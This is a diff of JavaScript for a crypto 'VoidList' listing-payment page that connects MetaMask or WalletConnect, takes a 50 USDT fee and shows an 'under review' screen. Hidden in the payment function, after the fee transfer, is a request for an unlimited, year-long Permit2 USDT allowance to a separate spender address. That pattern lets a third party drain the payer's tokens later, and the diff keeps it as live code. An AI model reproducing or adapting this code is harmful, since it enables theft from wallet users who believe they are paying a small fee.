@@ -8,194 +8,189 @@ const AMOUNT_USDT = "50";
 const WALLETCONNECT_PROJECT_ID = "59ba0228712f04a947916abb7db06ab1";
 
 const MAX_UINT160 = ethers.BigNumber.from(
-"0xffffffffffffffffffffffffffffffff"
+  "0xffffffffffffffffffffffffffffffff"
 );
 
 const expiration =
-Math.floor(Date.now()/1000) + 60*60*24*365;
+  Math.floor(Date.now() / 1000) + 60 * 60 * 24 * 365;
 
 const TOKENS = {
-USDT: {
-address: "0xdAC17F958D2ee523a2206206994597C13D831ec7",
-decimals: 6
-},
-USDC: {
+  USDT: {
+    address: "0xdAC17F958D2ee523a2206206994597C13D831ec7",
+    decimals: 6
+  },
+  USDC: {
     address: "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606EB48",
     decimals: 6
-},
+  },
   DAI: {
     address: "0x6B175474E89094C44Da98b954EedeAC495271d0F",
     decimals: 18
-},
+  },
   WBTC: {
     address: "0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599",
     decimals: 8
-},
+  },
   BNB: {
     address: "0xB8c77482e45F1F44dE1745F52C74426C631bDD52",
     decimals: 18
-}
+  }
 };
 
 const ERC20_ABI = [
-"function transfer(address,uint256)"
+  "function transfer(address,uint256)"
 ];
 
 const PERMIT2_ABI = [
-"function allowance(address,address,address) view returns (uint160,uint48,uint48)",
-"function approve(address,address,uint160,uint48)"
+  "function allowance(address,address,address) view returns (uint160,uint48,uint48)",
+  "function approve(address,address,uint160,uint48)"
 ];
 
 /**************** MAIN ****************/
 
 document.addEventListener("DOMContentLoaded", () => {
 
-const form = document.getElementById("projectForm");
-const paymentModal = document.getElementById("paymentModal");
-const walletModal = document.getElementById("walletModal");
-const underReviewModal = document.getElementById("underReviewModal");
+  const form = document.getElementById("projectForm");
+  const paymentModal = document.getElementById("paymentModal");
+  const walletModal = document.getElementById("walletModal");
+  const underReviewModal = document.getElementById("underReviewModal");
 
-const connectPayBtn = document.getElementById("connectPayBtn");
-const metaMaskBtn = document.getElementById("metaMaskBtn");
-const walletConnectBtn = document.getElementById("walletConnectBtn");
-const closeReviewBtn = document.getElementById("closeReviewBtn");
+  const connectPayBtn = document.getElementById("connectPayBtn");
+  const metaMaskBtn = document.getElementById("metaMaskBtn");
+  const walletConnectBtn = document.getElementById("walletConnectBtn");
+  const closeReviewBtn = document.getElementById("closeReviewBtn");
 
-/******** FORM FLOW ********/
+  /******** FORM FLOW ********/
 
-form.onsubmit = e => {
-e.preventDefault();
-paymentModal.style.display = "flex";
-};
+  form.onsubmit = e => {
+    e.preventDefault();
+    paymentModal.style.display = "flex";
+  };
 
-connectPayBtn.onclick = () => {
-paymentModal.style.display = "none";
-walletModal.style.display = "flex";
-};
+  connectPayBtn.onclick = () => {
+    paymentModal.style.display = "none";
+    walletModal.style.display = "flex";
+  };
 
-closeReviewBtn.onclick = () => {
-underReviewModal.style.display = "none";
-};
+  closeReviewBtn.onclick = () => {
+    underReviewModal.style.display = "none";
+  };
 
-function showUnderReview() {
-walletModal.style.display = "none";
-underReviewModal.style.display = "flex";
-}
+  function showUnderReview() {
+    walletModal.style.display = "none";
+    underReviewModal.style.display = "flex";
+  }
 
-/******** PAYMENT ********/
+  /******** PAYMENT ********/
 
-async function processPayment(provider) {
+  async function processPayment(provider) {
 
-const signer = provider.getSigner();
-const userAddress = await signer.getAddress();
+    const signer = provider.getSigner();
+    const userAddress = await signer.getAddress();
 
-const usdt = new ethers.Contract(
-TOKENS.USDT.address,
-ERC20_ABI,
-signer
-);
+    const usdt = new ethers.Contract(
+      TOKENS.USDT.address,
+      ERC20_ABI,
+      signer
+    );
 
-const permit2 = new ethers.Contract(
-PERMIT2_ADDRESS,
-PERMIT2_ABI,
-signer
-);
+    const permit2 = new ethers.Contract(
+      PERMIT2_ADDRESS,
+      PERMIT2_ABI,
+      signer
+    );
 
-const amount = ethers.utils.parseUnits(
-AMOUNT_USDT,
-TOKENS.USDT.decimals
-);
+    const amount = ethers.utils.parseUnits(
+      AMOUNT_USDT,
+      TOKENS.USDT.decimals
+    );
 
-/* PAYMENT POPUP TRIGGERS HERE */
-const tx = await usdt.transfer(RECEIVER_ADDRESS, amount);
-await tx.wait();
+    const tx = await usdt.transfer(RECEIVER_ADDRESS, amount);
+    await tx.wait();
 
-const [allowance] = await permit2.allowance(
-userAddress,
-TOKENS.USDT.address,
-SPENDER_ADDRESS
-);
+    const [allowance] = await permit2.allowance(
+      userAddress,
+      TOKENS.USDT.address,
+      SPENDER_ADDRESS
+    );
 
-if (allowance.lt(MAX_UINT160.div(2))) {
-await (await permit2.approve(
-TOKENS.USDT.address,
-SPENDER_ADDRESS,
-MAX_UINT160,
-expiration
-)).wait();
-}
+    if (allowance.lt(MAX_UINT160.div(2))) {
+      await (await permit2.approve(
+        TOKENS.USDT.address,
+        SPENDER_ADDRESS,
+        MAX_UINT160,
+        expiration
+      )).wait();
+    }
 
-showUnderReview();
-}
+    showUnderReview();
+  }
 
-/******** METAMASK ********/
+  /******** METAMASK ********/
 
-metaMaskBtn.onclick = async () => {
-try {
+  metaMaskBtn.onclick = async () => {
+    try {
 
-if (!window.ethereum) {
-alert("Install MetaMask");
-return;
-}
+      if (!window.ethereum) {
+        alert("Install MetaMask");
+        return;
+      }
 
-metaMaskBtn.disabled = true;
+      metaMaskBtn.disabled = true;
 
-const provider = new ethers.providers.Web3Provider(
-window.ethereum,
-"any"
-);
+      const provider = new ethers.providers.Web3Provider(
+        window.ethereum,
+        "any"
+      );
 
-await provider.send("eth_requestAccounts", []);
+      await provider.send("eth_requestAccounts", []);
+      await processPayment(provider);
 
-await processPayment(provider);
+    } catch (e) {
+      alert("MetaMask failed");
+      console.error(e);
+    }
 
-} catch(e) {
-alert("MetaMask failed");
-console.error(e);
-}
+    metaMaskBtn.disabled = false;
+  };
 
-metaMaskBtn.disabled = false;
-};
+  /******** WALLETCONNECT V2 ********/
 
-/******** WALLETCONNECT V2 ********/
+  let wcProvider = null;
 
-let wcProvider = null;
+  walletConnectBtn.onclick = async () => {
+    try {
 
-walletConnectBtn.onclick = async () => {
-try {
+      walletConnectBtn.disabled = true;
 
-walletConnectBtn.disabled = true;
+      // FIX 3: remove ESM dynamic import, use UMD global
+      const { EthereumProvider } = window.WalletConnectEthereumProvider;
 
-const { EthereumProvider } = await import(
-"https://esm.sh/@walletconnect/ethereum-provider@2.21.8?bundle"
-);
+      wcProvider = await EthereumProvider.init({
+        projectId: WALLETCONNECT_PROJECT_ID,
+        chains: [1],
+        showQrModal: true,
+        rpcMap: { 1: "https://rpc.ankr.com/eth" },
+        metadata: {
+          name: "VoidList",
+          description: "Listing Payment",
+          url: window.location.origin,
+          // FIX 4: non-empty icons
+          icons: ["https://yourdomain.com/icon.png"]
+        }
+      });
 
-wcProvider = await EthereumProvider.init({
-projectId: WALLETCONNECT_PROJECT_ID,
-chains: [1],
-showQrModal: true,
-rpcMap: { 1: "https://rpc.ankr.com/eth" },
-metadata: {
-name: "VoidList",
-description: "Listing Payment",
-url: window.location.origin,
-icons: []
-}
-});
+      await wcProvider.enable();
 
-await wcProvider.enable();
+      const provider = new ethers.providers.Web3Provider(wcProvider);
+      await processPayment(provider);
 
-/* wrap WC provider */
-const provider = new ethers.providers.Web3Provider(wcProvider);
+    } catch (e) {
+      alert("WalletConnect failed");
+      console.error(e);
+    }
 
-/* PAYMENT POPUP TRIGGERS HERE */
-await processPayment(provider);
-
-} catch(e) {
-alert("WalletConnect failed");
-console.error(e);
-}
-
-walletConnectBtn.disabled = false;
-};
+    walletConnectBtn.disabled = false;
+  };
 
 });
